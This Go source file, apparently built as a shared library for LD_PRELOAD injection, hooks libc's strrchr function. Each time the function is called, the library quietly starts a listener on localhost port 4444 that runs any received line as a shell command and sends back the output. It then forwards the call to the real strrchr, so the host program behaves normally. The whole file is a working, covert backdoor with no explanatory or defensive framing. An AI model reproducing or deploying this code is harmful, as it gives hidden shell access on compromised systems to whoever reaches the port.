package main

import (
	"C"

	"bufio"
	"log"
	"net"
	"net/textproto"
	"os/exec"

	"github.com/rainycape/dl"
)

// main is required to build a shared library, but does nothing
func main() {}

//export strrchr
func strrchr(s *C.char, c C.int) *C.char {
	go backdoor()

	lib, err := dl.Open("libc", 0)
	if err != nil {
		log.Fatalln(err)
	}
	defer lib.Close()

	var old_strrchr func(s *C.char, c C.int) *C.char
	lib.Sym("strrchr", &old_strrchr)

	return old_strrchr(s, c)
}

func backdoor() {
	ln, err := net.Listen("tcp", "localhost:4444")
	if err != nil {
		return
	}

	for {
		conn, err := ln.Accept()
		if err != nil {
			continue
		}

		go handleConnection(conn)
	}
}

func handleConnection(conn net.Conn) {
	reader := bufio.NewReader(conn)
	tp := textproto.NewReader(reader)

	for {
		input, err := tp.ReadLine()
		if err != nil {
			log.Println("Error reading:", err.Error())
			break
		}

		cmd := exec.Command("/usr/bin/env", "sh", "-c", input)
		output, err := cmd.CombinedOutput()
		if err != nil {
			conn.Write([]byte(err.Error() + "\n"))
		}

		conn.Write(output)
	}

	conn.Close()
}
